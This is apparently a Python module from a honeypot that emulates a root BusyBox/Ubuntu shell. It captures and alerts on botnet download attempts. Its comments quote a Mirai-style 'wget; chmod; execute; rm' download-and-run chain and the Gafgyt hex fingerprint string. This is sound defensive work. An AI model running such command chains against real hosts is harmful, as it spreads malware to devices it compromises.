import threading
import time
import json
import re
from logger import log_event
from alerts.discord import send_alert
from payloads import save_payload

# Max concurrent shell sessions across all services
_session_cap = threading.Semaphore(20)

# URL regex for download attempts
URL_REGEX = re.compile(r"https?://\S+")

# Splits a compound shell line into individual sub-commands. Deliberately only
# ';', '&&', '||' and a single '|' — NOT a lone '&' (backgrounding), because a
# lone '&' is also the query-string separator in a real URL
# (http://x/y?a=1&b=2) and splitting on it would corrupt a download URL sitting
# in the middle of a compound line. '|' is safe to always split on: it is not
# a valid character inside a URL. This exists because real attacker/botnet
# command lines are essentially always compound
# ("cd /tmp; wget URL; chmod 777 f; ./f; rm -rf f") and the naive single-token
# dispatch below used to only ever look at the FIRST word — meaning a URL sitting
# after a ';' was invisible to logging/alerting entirely. Confirmed live: 165
# real multi-architecture download attempts (mips/arm/ppc/m68k/... botnet spray)
# were being silently swallowed this way before this fix.
COMPOUND_SPLIT_RE = re.compile(r"\s*(?:;|&&|\|\|)\s*|\s*\|\s*")

# Fake filesystem content
_FS = {
    "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
    "/etc/hostname": "ubuntu\n",
    "/etc/os-release": 'PRETTY_NAME="Ubuntu 22.04.3 LTS"\nNAME="Ubuntu"\nVERSION_ID="22.04"\n',
    "/proc/version": "Linux version 5.15.0-76-generic (buildd@lcy02-amd64-067) (gcc (Ubuntu 11.3.0-1ubuntu1~22.04.1) 11.3.0) #83-Ubuntu SMP Tue Jun 20 16:02:47 UTC 2023\n",
    "/var/log/auth.log": "Jul  4 10:20:01 ubuntu sshd[1234]: Accepted password for root from 1.2.3.4 port 54321 ssh2\n",
}

# Mirai/Gafgyt-family botnet loaders send a fingerprint probe sequence before
# ever attempting a download: "/bin/busybox <random-string>", then some subset
# of "sh"/"shell"/"system"/"linuxshell"/"enable"/"enablelinuxshell" — checking
# that the target is a genuine BusyBox-based embedded Linux shell before
# proceeding. A real BusyBox binary invoked with an unrecognized applet name
# prints its usage/applet-list banner; without this, those probes all fell
# through to "command not found", which doesn't match what a real vulnerable
# device says — so scripted loaders correctly concluded this wasn't a real
# target and never sent the actual wget/tftp payload command. This banner is
# intentionally abbreviated (not the full ~300 applets real BusyBox lists) but
# includes the ones a loader is actually checking for (sh, wget, tftp) — full
# authenticity doesn't matter here, only "the loader's own parsing logic is
# satisfied." "linuxshell"/"enable"/"enablelinuxshell" were added after the
# first pass at this fix: real captured traffic showed "linuxshell" alone at
# 8,686 occurrences, tied with sh/shell/system — the exact same probe family,
# just missed tokens.
_BUSYBOX_BANNER = (
    "BusyBox v1.33.1 (2022-02-01 00:00:00 UTC) multi-call binary.\r\n"
    "BusyBox is copyrighted by many authors between 1998-2015.\r\n"
    "Licensed under GPLv2. See source distribution for detailed\r\n"
    "copyright notices.\r\n"
    "\r\n"
    "Usage: busybox [function] [arguments]...\r\n"
    "   or: busybox --list\r\n"
    "   or: function [arguments]...\r\n"
    "\r\n"
    "\tBusyBox is a multi-call binary that combines many common Unix\r\n"
    "\tutilities into a single executable.  Most people will create a\r\n"
    "\tlink to busybox for each function they wish to use and BusyBox\r\n"
    "\twill act like whatever it was invoked as.\r\n"
    "\r\n"
    "Currently defined functions:\r\n"
    "\tarp, ash, awk, base64, brctl, cat, chmod, chown, chpasswd, cp, cut, date, "
    "dd, df, dhcprelay, dmesg, du, echo, egrep, env, expr, find, free, ftpget, "
    "ftpput, grep, gzip, halt, head, hexdump, hostname, httpd, id, ifconfig, "
    "init, insmod, ip, iptables, kill, killall, ln, login, logread, ls, lsmod, "
    "md5sum, mkdir, mknod, mount, mv, nc, netstat, nslookup, ntpd, passwd, "
    "ping, printf, ps, pwd, reboot, rm, rmdir, rmmod, route, sed, sh, sleep, "
    "sort, sync, syslogd, tail, tar, tee, telnet, telnetd, tftp, top, touch, "
    "tr, traceroute, udhcpc, umount, uname, uniq, uptime, vconfig, vi, "
    "watchdog, wc, wget, which, who, whoami, xargs, zcat\r\n"
)

_HEX_ESCAPE_RE = re.compile(r"\\x([0-9a-fA-F]{2})")


def _decode_echo_arg(arg):
    """Interprets \\xHH hex escapes the way `echo -e`/busybox echo does — this
    is specifically for botnet fingerprint-marker checks like
    echo -e "\\x47\\x41\\x59\\x46\\x47\\x54" (decodes to "GAYFGT", the
    Gafgyt/Bashlite family's own signature string, confirmed in real captured
    traffic: 12 hits of that exact sequence, 2 hits of an "auth_ok" variant —
    both previously fell through to "bash: echo: command not found" and
    silently aborted the loader right after it passed the busybox check."""
    return _HEX_ESCAPE_RE.sub(lambda m: chr(int(m.group(1), 16)), arg)


def dispatch_command(sub_line, send_fn, ip, port, service, cwd):
    """Handles one already-split sub-command. Returns the (possibly updated)
    cwd. Never prints the prompt itself — the caller does that once per
    original (possibly compound) input line, matching real shell behavior."""
    parts = sub_line.split()
    if not parts:
        return cwd
    cmd = parts[0]
    args = parts[1:]

    if cmd in ("exit", "logout"):
        return cwd
    elif cmd in ("id", "whoami"):
        send_fn("uid=0(root) gid=0(root) groups=0(root)\r\n")
    elif cmd == "uname":
        if "-a" in args:
            send_fn("Linux ubuntu 5.15.0-76-generic #83-Ubuntu SMP Tue Jun 20 16:02:47 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux\r\n")
        else:
            send_fn("Linux\r\n")
    elif cmd == "pwd":
        send_fn(f"{cwd}\r\n")
    elif cmd == "ls":
        if cwd == "/root":
            send_fn(".  ..  .bash_history  .bashrc  .profile\r\n")
        else:
            send_fn("\r\n")
    elif cmd == "cd":
        if args:
            new_path = args[0]
            if new_path == "/":
                cwd = "/"
            elif new_path == "~" or new_path == "/root":
                cwd = "/root"
            # Simple cd support - don't overcomplicate
        else:
            cwd = "/root"
    elif cmd == "cat":
        if args:
            path = args[0]
            # Normalize path slightly
            if not path.startswith("/"):
                full_path = f"{cwd}/{path}".replace("//", "/")
            else:
                full_path = path

            if full_path in _FS:
                send_fn(_FS[full_path].replace("\n", "\r\n"))
            else:
                send_fn(f"cat: {path}: No such file or directory\r\n")
        else:
            pass  # cat with no args just hangs in real bash, we ignore
    elif cmd in ("busybox", "/bin/busybox", "/usr/bin/busybox"):
        send_fn(_BUSYBOX_BANNER)
    elif cmd in ("sh", "shell", "system", "linuxshell", "enable", "enablelinuxshell"):
        pass  # "entered" a subshell; falls through to reprint the prompt below
    elif cmd == "echo":
        # -e (and busybox's default-on hex-escape behavior) — decode \xHH
        # sequences so fingerprint-marker checks like the Gafgyt one above
        # see the string they're looking for.
        echo_args = [a for a in args if a != "-e"]
        send_fn(_decode_echo_arg(" ".join(echo_args)) + "\r\n")
    elif cmd in ("wget", "curl"):
        urls = URL_REGEX.findall(sub_line)
        event = log_event(ip, port, service, "download_attempt", {"command": sub_line, "urls": urls})
        save_payload(ip, service, sub_line.encode("utf-8", errors="replace"), event_id=event.get("rowid"))
        send_alert(service, ip, f"Download attempt in shell: `{sub_line}`", alert_type="download_attempt")
        time.sleep(1)
        send_fn(f"{cmd}: connecting to {urls[0] if urls else 'remote host'}... failed: Connection refused.\r\n")
    elif cmd in ("chmod", "rm", "mv", "cp", "mkdir", "touch"):
        pass  # real versions of these are silent on success; keeps the illusion
              # coherent through the rest of a "wget; chmod +x f; ./f; rm f" chain
    elif cmd.startswith("./") or cmd.startswith("/"):
        # Execution attempt against a path, not a PATH-resolved command name —
        # real bash distinguishes this from "command not found": since our
        # fake wget/curl always "fails" above, the file genuinely never got
        # created, so this response is the truthful, consistent next step.
        send_fn(f"bash: {cmd}: No such file or directory\r\n")
    else:
        send_fn(f"bash: {cmd}: command not found\r\n")

    return cwd


def run_shell(send_fn, recv_line_fn, ip, port, service, username, session=None):
    """
    Runs a fake interactive shell.
    send_fn(text): function to send string to client
    recv_line_fn(): function that returns one line of input (stripped of IAC/ANSI)
    session: optional session_recorder.SessionRecorder — send_fn should already be
        wrapped with session.wrap() by the caller (so keystroke echo in recv_line_fn
        is captured too); this is only used here to tally command_count. The caller
        owns session.finalize(), not this function, since a caller-side auth loop can
        end before run_shell is ever reached.
    """
    if not _session_cap.acquire(blocking=False):
        send_fn("bash: fork: Resource temporarily unavailable\r\n")
        return

    try:
        send_fn(f"root@ubuntu:~# ")
        cwd = "/root"

        while True:
            line = recv_line_fn()
            if line is None: # Connection closed
                break

            line = line.replace("\x00", "").strip()
            if not line:
                send_fn(f"root@ubuntu:{cwd}# ")
                continue

            # Log every command (full compound line, exactly as received). Tagged
            # with the session's own uuid (when recording) so the Events tab can
            # cross-link straight back to the session replay this came from — the
            # same connection_id mechanism Redis/SMTP/FTP/MySQL/Postgres already use.
            log_event(ip, port, service, "command", {"cmd": line, "cwd": cwd},
                      connection_id=session.session_uuid if session else None)
            if session:
                session.record_command()

            # Dispatch each sub-command of a compound line in sequence — see
            # COMPOUND_SPLIT_RE for why this matters. A plain single command
            # is just a one-element split, so this subsumes the old behavior.
            should_exit = False
            for sub_line in COMPOUND_SPLIT_RE.split(line):
                sub_line = sub_line.strip()
                if not sub_line:
                    continue
                first_word = sub_line.split()[0] if sub_line.split() else ""
                if first_word in ("exit", "logout"):
                    should_exit = True
                    break
                cwd = dispatch_command(sub_line, send_fn, ip, port, service, cwd)

            if should_exit:
                break

            send_fn(f"root@ubuntu:{cwd}# ")

    finally:
        _session_cap.release()
